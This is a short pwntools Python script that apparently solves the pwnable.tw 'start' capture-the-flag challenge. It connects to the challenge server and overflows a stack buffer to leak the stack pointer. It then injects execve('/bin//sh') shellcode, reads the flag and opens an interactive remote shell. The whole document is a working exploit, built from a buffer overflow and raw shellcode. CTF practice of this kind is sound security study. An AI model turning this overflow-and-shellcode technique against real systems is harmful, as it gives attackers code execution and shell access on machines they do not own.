from pwn import *
import warnings
warnings.filterwarnings("ignore", category = BytesWarning)

r = remote("chall.pwnable.tw", 10000)
#r = process('./start')
write = 0x08048087

p1 = b'a' * 0x14 + p32(write)
r.sendafter(b':', p1)
old_esp = u32(r.recv(4))
r.recv()
success('Old_esp = %s' % hex(old_esp))

shellcode=b'\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xDB\x31\xC9\x31\xD2\x89\xE3\x83\xC0\x0B\xCD\x80'

p2 = b'b' * 0x14 + p32(old_esp + 0x14) + shellcode  # No asm() needed if shellcode is already bytecode

r.send(p2)
r.sendline('cat /home/`whoami`/flag')
r.interactive()